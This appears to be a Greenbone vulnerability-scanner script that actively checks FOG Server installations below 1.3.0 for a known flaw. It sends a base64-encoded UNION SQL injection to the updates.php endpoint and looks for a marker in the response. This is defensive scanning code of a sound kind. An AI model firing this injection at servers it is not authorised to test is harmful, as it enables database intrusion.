# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:fogproject:fog";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106383");
  script_version("2024-11-08T15:39:48+0000");
  script_tag(name:"last_modification", value:"2024-11-08 15:39:48 +0000 (Fri, 08 Nov 2024)");
  script_tag(name:"creation_date", value:"2016-11-10 15:06:58 +0700 (Thu, 10 Nov 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("FOG Server < 1.3.0 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_fog_server_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("fog_server/installed");

  script_tag(name:"summary", value:"FOG Server is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to execute an SQL injection via a crafted HTTP GET
  request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - SQL injection: The database functions located in the FOGManagerController.class.php file do not
  sanitize some parameters, which can input from unauthenticated users.

  - Remote Command Execution: The freespace.php file does not correctly sanitize user-supplied
  'idnew' parameters. An unauthenticated attacker may use this file to execute system commands.");

  script_tag(name:"impact", value:"An authenticated attacker may execute arbitrary system commands
  or retrieve sensitive information from the database.");

  script_tag(name:"affected", value:"FOG Server version 1.2.0 and prior.");

  script_tag(name:"solution", value:"Update to version 1.3.0 or later.");

  script_xref(name:"URL", value:"https://sysdream.com/news/lab/2016-07-19-fog-project-multiple-vulnerabilities/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

vt_strings = get_vt_strings();
plain_str = "' UNION ALL SELECT NULL,NULL,0x" + vt_strings["default_rand_hex"] + ",NULL,NULL-- ";
base64_str = base64(str: plain_str);

url = dir + "/service/updates.php?action=ask&file=" + base64_str;

if (http_vuln_check(port: port, url: url, pattern: vt_strings["default_rand"], check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
